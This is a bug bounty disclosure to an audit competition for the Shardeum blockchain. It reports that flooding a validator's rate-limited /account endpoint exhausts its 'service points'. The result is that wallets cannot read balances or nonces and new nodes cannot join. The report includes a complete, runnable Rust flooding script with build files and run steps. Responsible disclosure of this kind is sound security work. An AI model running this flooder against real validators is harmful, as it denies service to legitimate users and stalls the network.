# #39164 \[BC-Insight] service point exhaustion

## #39164 \[BC-Insight] Service point exhaustion

**Submitted on Jan 23rd 2025 at 18:42:04 UTC by @ZhouWu for** [**Audit Comp | Shardeum: Core III**](https://immunefi.com/audit-competition/audit-comp-shardeum-core-iii)

* **Report ID:** #39164
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/shardeum/shardeum/tree/bugbounty>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

### Description

## Description

In shardeum some endpoint like /account and /tx are throttled behind a rate limit mechanism called service point. The way these point works is they're deducted each time a request is called and if the point is 0 within the x interval time , the validator will no longer serve the request until the interval time is over. The point is then reset to the initial value at the start of the next interval. According to `bugbountry` branch's parameter only 400 request per second is allowed to served for `/account` endpoint. The attack involved a script that basically exhaust these point on validator so validator can no longer serve endpoint to other legit shardeum users. Since 400 request per second is so low for modern computer, the attack is easily achievable. [service point code](https://github.com/shardeum/shardeum/blob/1306df022693a30c9da27dbb3c74bf024332b941/src/index.ts#L295)

## Impact

In evm compitable network like shardeum and ethereum ecosystem like web3.js, ether.js, metamask and other wallets want to submit transactions, they read the data of the balance to check for things like nonce and balance. Since the `/account` endpoint is exhausted, the rpc can no longer serve `eth_getBalance` and `eth_getTransactionCount` thus the wallet will no longer be able to read the data and will not be able to submit transactions. This will result in a denial of service attack on the network even if `/inject` endpoint is still avialable.

Not only that since `/account` endpoint is also used for node joining process if we could exhaust the endpoint to the enough validator, the network will no longer be able to accept new node to join the network.

Additionally a scenario could be that one bad validator operator can exhaust the points from other competitive validators so the chances or rpc querying account data from its node increases, therefore it can manipulate the rpc into returning bad data towards clients.

### Proof of Concept

## POC

Create a rust script that will send 400 request per second to `/account` endpoint

1. Run the network to act as legit network running on a seperate machine independently from the machine that the exploit script will run on.
2. create a directory save the exploit in go into the directory by doing`mkdir exploit; cd exploit`

* save following code to `src/main.rs`

```rust
use reqwest;
use std::sync::Arc;

#[tokio::main]
async fn main() {
    let args = std::env::args().collect::<Vec<String>>();


    println!("Args{:?}", args);

    let ip = Arc::new(args[1].clone());
    let port = Arc::new(args[2].clone());

    let tps = Arc::new(500.0);


    let interval = tokio::time::Duration::from_secs_f64(1.0 / *tps as f64);
    let mut interval_timer = tokio::time::interval(interval);
    

    let client = Arc::new(reqwest::Client::new());
    loop {
        interval_timer.tick().await;

        let ip = ip.clone();
        let port = port.clone();
        let client = Arc::clone(&client);
        tokio::spawn(async move {
            let full_url = format!("http://{}:{}/account/0000000000000000000000000000000000000000000000000000000000000000", ip, port);
            let res = client.get(&full_url).send().await.expect("Connection Reset");
            let body = res.json::<serde_json::Value>().await.expect("Couldn't parse body");
            
            match body["error"].as_str() {
                Some(err) => {
                    print!("\rservice point exhausted: {}", err);
                },
                _ => {}
            }
        });
    }

}

```

* save following contents to `Cargo.toml`

```
[package]
name = "service_point_exhaustion"
version = "0.1.0"
edition = "2021"

[dependencies]
reqwest = { version = "0.12.9", features = ["json"] }
serde = "1.0.217"
serde_json = "1.0.137"
tokio = { version = "1.16.1", features = ["full"] }
```

* save following contents to `rust-toolchain`

```
[toolchain]
channel = "1.81.0"
```

3. Run the script using `cargo run -- <IP> <PORT>`. For example `cargo run -- 1.1.1.1 9001`
4. Using your browser or http client to act as legit user and check the victim of the ip and port you input if the `/account` endpoint is no longer available to serve request. It will return with `node busy`.
